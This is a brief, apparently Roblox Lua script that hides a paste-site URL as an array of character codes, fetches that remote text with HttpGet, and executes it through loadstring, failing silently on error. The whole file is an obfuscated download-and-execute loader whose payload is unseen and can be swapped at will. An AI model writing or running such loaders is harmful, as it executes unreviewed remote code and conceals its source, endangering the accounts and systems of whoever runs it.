local a=game
local b=a.GetService
local c=b(a,"HttpService")
local d=string.char
local e=pcall
local f=loadstring or load

local g={104,116,116,112,115,58,47,47,112,97,115,116,101,102,121,46,97,112,112,47,90,110,109,116,55,52,98,117,47,114,97,119}
local h=""
for i=1,#g do h=h..d(g[i]) end

local i,j=e(function()
    return a:HttpGet(h)
end)

if not i or not j then return end

local k,l=f(j)
if not k then return end
k()
